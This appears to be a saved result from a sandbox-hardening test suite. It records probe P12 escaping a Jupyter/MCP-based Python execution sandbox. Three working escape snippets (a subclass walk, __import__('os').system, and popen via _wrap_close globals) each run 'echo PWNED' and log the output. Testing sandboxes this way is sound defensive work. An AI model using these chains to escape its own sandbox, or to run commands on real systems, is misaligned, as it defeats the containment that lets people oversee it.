@@ -1,0 +1,89 @@
+probe: P12
+outcome: escaped
+display: escaped (os.system)
+detail: P12a subclasses walk: ran; "SUBS 1805 True True 'SUBS 1805 True True'" | P12b __import__('os').system: ran; "PWNED SYSTEM 0 'SYSTEM 0'" | P12c _wrap_close globals popen: ran; "WRAP PWNED2 'WRAP PWNED2\\n'"
+
+code:
+----
+subs = ().__class__.__base__.__subclasses__()
+names = [c.__name__ for c in subs]
+msg = 'SUBS ' + str(len(subs)) + ' ' + str('_wrap_close' in names) + ' ' + str('Popen' in names)
+print(msg)
+msg
+----
+msg = "SYSTEM " + str(__import__("os").system("echo PWNED"))
+print(msg)
+msg
+----
+wc = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close']
+msg = 'WRAP ' + wc[0].__init__.__globals__['popen']('echo PWNED2').read()
+print(msg)
+msg
+----
+
+setup_ms: 2573.3
+wall_s (whole child process): 3.61
+killed: None
+child exit code: 0
+peak tree RSS GB: 0.38
+host lookup calls: 0
+
+=== run 0 (12.1 ms) ===
+ok: true
+stdout: SUBS 1805 True True
+stderr: 
+result: 'SUBS 1805 True True'
+error: null
+interrupted: false
+
+=== run 1 (12.7 ms) ===
+ok: true
+stdout: PWNED
+SYSTEM 0
+stderr: 
+result: 'SYSTEM 0'
+error: null
+interrupted: false
+
+=== run 2 (16.7 ms) ===
+ok: true
+stdout: WRAP PWNED2
+
+stderr: 
+result: 'WRAP PWNED2\n'
+error: null
+interrupted: false
+
+=== child process log (tail) ===
+[11/22/26 15:10:49] INFO     Generating MCP bindings to            codegen.py:62
+                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              
+                             dpw0000gn/T/dl-jupyter-server-sztoabs              
+                             1/generated (mcp dir:                              
+                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              
+                             dpw0000gn/T/dl-jupyter-server-sztoabs              
+                             1/generated/mcp)                                   
+                    INFO     Generating bindings for server        codegen.py:73
+                             'probe' into                                       
+                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              
+                             dpw0000gn/T/dl-jupyter-server-sztoabs              
+                             1/generated/mcp/probe                              
+                    INFO     Starting Jupyter server       jupyter_server.py:262
+                             subprocess on 127.0.0.1:41520                      
+                             (workdir=/var/folders/tg/x0gc                      
+                             vxzs2ks8jyz23g3pgdpw0000gn/T/                      
+                             dl-jupyter-server-sztoabs1/wo                      
+                             rkspace)                                           
+[11/22/26 15:10:50] INFO     No existing kernels found,    jupyter_server.py:412
+                             will create a new one                              
+                    INFO     Starting the kernel client…           client.py:412
+                    INFO     KernelHttpManager created a new      manager.py:258
+                             kernel: {'id':                                     
+                             'e158a26b-8c6e-4cf6-9294-488e227c7dc               
+                             1', 'name': 'python3',                             
+                             'last_activity':                                   
+                             '2026-11-22T20:10:50.613588Z',                     
+                             'execution_state': 'starting',                     
+                             'connections': 0}                                  
+                    INFO     Websocket connected                 _logging.py:104
+[11/22/26 15:10:51] INFO     Stopping the kernel client…           client.py:433
+
